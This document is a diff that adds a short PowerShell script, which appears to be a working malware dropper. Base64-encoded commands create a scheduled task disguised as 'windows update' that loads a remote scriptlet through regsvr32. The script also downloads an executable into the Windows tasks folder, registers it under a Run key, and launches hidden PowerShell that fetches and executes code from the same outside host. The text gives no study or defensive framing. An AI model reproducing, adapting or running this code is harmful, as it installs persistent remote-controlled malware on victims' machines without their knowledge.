@@ -1,0 +1,19 @@
+function ConvertFrom-Base64($string) {
+   $bytes  = [System.Convert]::FromBase64String($string);
+   $decoded = [System.Text.Encoding]::UTF8.GetString($bytes); 
+   return $decoded;
+}
+
+$WSH = New-Object -Com WScript.Shell;
+$decode = ConvertFrom-Base64("c2NodGFza3MgL2NyZWF0ZSAvdG4gIndpbmRvd3MgdXBkYXRlIiAvdHIgInJlZ3N2cjMyIC91IC9zIC9pOmh0dHA6Ly9qb2Iuc29mdGxpbmUudG9wL2FkMi5qcGcgc2Nyb2JqLmRsbCIgL3NjIGRhaWx5IC9zdCAxMjowMCAvRg==");
+$WSH.Run($decode,0);
+
+
+$client = new-object System.Net.WebClient
+$client.DownloadFile('http://job.softline.top/SCHEDLGU.exe', 'c:\\windows\\tasks\\SCHEDLGU.exe')
+$decode3 = ConvertFrom-Base64("cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAvdiAid2luZG93cyB0YXNrcyBjaGVjayIgL3QgUkVHX1NaIC9kICJjOlx3aW5kb3dzXHRhc2tzXFNDSEVETEdVLmV4ZSIgL2Y=");
+$WSH.Run($decode3,0);
+
+
+$decode2 = ConvertFrom-Base64("cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1XaW5kb3dzdHlsZSBoaWRkZW4gLW5vbmludGVyYWN0aXZlIC1ub2xvZ28gSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vam9iLnNvZnRsaW5lLnRvcC9sb2FkaW5nbGl0LmdpZicp");
+$WSH.Run($decode2,0);
